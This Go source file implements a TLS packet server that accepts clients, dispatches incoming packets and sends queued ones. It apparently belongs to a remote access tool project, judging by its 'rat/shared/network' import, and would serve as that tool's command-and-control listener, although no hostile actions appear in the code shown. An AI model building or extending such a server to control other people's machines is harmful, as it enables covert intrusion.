package main

import (
	"crypto/tls"
	"errors"
	"fmt"
	"rat/shared/network"
	"strconv"
)

// TLSServer is the default TCP server using TLS encryption
type TLSServer struct {
	Address string `json:"host"`
}

func (server TLSServer) Listen() error {
	// Load local keypair
	cert, _ := tls.LoadX509KeyPair("cert.pem", "private.key")
	config := tls.Config{Certificates: []tls.Certificate{cert}}

	// Spawn server
	listener, _ := tls.Listen("tcp", server.Address, &config)

	for {
		conn, err := listener.Accept()

		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		client := NewClient(conn)
		client.Reader = network.Reader{conn}
		client.Writer = network.Writer{conn}

		go server.ReadRoutine(client)
		go server.WriteRoutine(client)
		go client.Heartbeat()
	}
}

// ReadRoutine is the routine for continuously reading packets for this client
// Removes client on any read error, invalid packet header or deserializing error
func (server TLSServer) ReadRoutine(c *Client) {
	for {
		var packet interface{}
		var err error

		header, err := c.ReadHeader()

		if err != nil {
			goto err
		}

		packet = GetIncomingPacket(header)
		if packet == nil {
			err = errors.New("invalid header " + strconv.Itoa(int(header)))
			goto err
		}

		packet, err = c.Reader.ReadPacket(packet)
		if err != nil {
			goto err
		}

		err = packet.(IncomingPacket).OnReceive(c)
		if err != nil {
			goto err
		}

		continue

	err:
		fmt.Println("remove", err.Error())
		removeClient(c)
		break
	}
}

// WriteRoutine polls all packets added to the packet channel for a specific client
// Will call Init() on each packet and write it
func (server TLSServer) WriteRoutine(client *Client) {
	for {
		packet := <-client.Queue
		packet.Init(client)
		client.WritePacket(packet)
	}
}
